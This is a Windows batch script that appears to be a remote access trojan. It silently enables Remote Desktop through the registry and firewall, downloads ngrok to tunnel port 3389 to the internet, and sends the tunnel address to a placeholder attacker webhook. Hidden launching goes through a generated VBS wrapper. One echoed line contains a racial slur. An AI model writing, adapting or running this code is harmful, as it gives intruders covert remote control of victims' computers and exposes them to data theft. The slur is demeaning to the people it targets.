@echo off

goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...
    
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Success: Administrative permissions confirmed.
        goto after

    ) else (
        echo RERUN WITH ADMIN!!!
        goto check_Permissions
    )
    
    pause >nul

:after
cd %userprofile%\AppData\Local\Temp
set webhook=YOUR_WEBHOOK_HERE
echo CreateObject(^"Wscript.Shell^").Run ^"" & WScript.Arguments(0) & "^", 0, False > %userprofile%\AppData\Local\Temp\run.vbs



echo @echo off > %userprofile%\AppData\Local\Temp\rat.bat
echo title rat >> %userprofile%\AppData\Local\Temp\rat.bat
echo set PATH=%PATH%;%~dp0 >> %userprofile%\AppData\Local\Temp\rat.bat
echo cd %userprofile%\AppData\Local\Temp >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::goto check_Permissions >> %userprofile%\AppData\Local\Temp\rat.bat
echo :: >> %userprofile%\AppData\Local\Temp\rat.bat
echo :::check_Permissions >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    echo Administrative permissions required. Detecting permissions... >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::     >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    net session >nul 2>&1 >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    if %errorLevel% == 0 ( >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::        echo Success: Administrative permissions confirmed. >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::        goto regshit >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    ) else ( >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::        echo Failure: Current user is not an administrator. >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::        pause >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::        goto check_Permissions >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    ) >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::     >> %userprofile%\AppData\Local\Temp\rat.bat
echo ::    pause >nul >> %userprofile%\AppData\Local\Temp\rat.bat
echo :: >> %userprofile%\AppData\Local\Temp\rat.bat
:: SCARY STUFF
echo :regshit >> %userprofile%\AppData\Local\Temp\rat.bat
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> %userprofile%\AppData\Local\Temp\rat.bat
echo netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >> %userprofile%\AppData\Local\Temp\rat.bat
:: END OF SCARY STUFF
echo cd %PATH% >> %userprofile%\AppData\Local\Temp\rat.bat
echo echo nah nigga >> %userprofile%\AppData\Local\Temp\rat.bat
echo curl -O https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip >> %userprofile%\AppData\Local\Temp\rat.bat
echo powershell Expand-Archive ngrok-v3-stable-windows-amd64.zip >> %userprofile%\AppData\Local\Temp\rat.bat
echo cd ngrok-v3-stable-windows-amd64 >> %userprofile%\AppData\Local\Temp\rat.bat
echo wscript.exe "%userprofile%\AppData\Local\Temp\run.vbs" "%userprofile%\AppData\Local\Temp\grab.bat" >> %userprofile%\AppData\Local\Temp\rat.bat
echo ngrok tcp 3389 >> %userprofile%\AppData\Local\Temp\rat.bat

wscript.exe "%userprofile%\AppData\Local\Temp\run.vbs" "%userprofile%\AppData\Local\Temp\rat.bat"
timeout 5

echo ::@echo off > %userprofile%\AppData\Local\Temp\grab.bat
echo cd %userprofile%\AppData\Local\Temp >> %userprofile%\AppData\Local\Temp\grab.bat
echo timeout 7 >> %userprofile%\AppData\Local\Temp\grab.bat
echo curl -o %userprofile%\AppData\Local\Temp\rat.txt http://127.0.0.1:4040/api/tunnels >> %userprofile%\AppData\Local\Temp\grab.bat
::echo ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt >> %userprofile%\AppData\Local\Temp\grab.bat
echo curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\rat.txt %webhook%  >> %userprofile%\AppData\Local\Temp\grab.bat
::echo curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook%  >> %userprofile%\AppData\Local\Temp\grab.bat

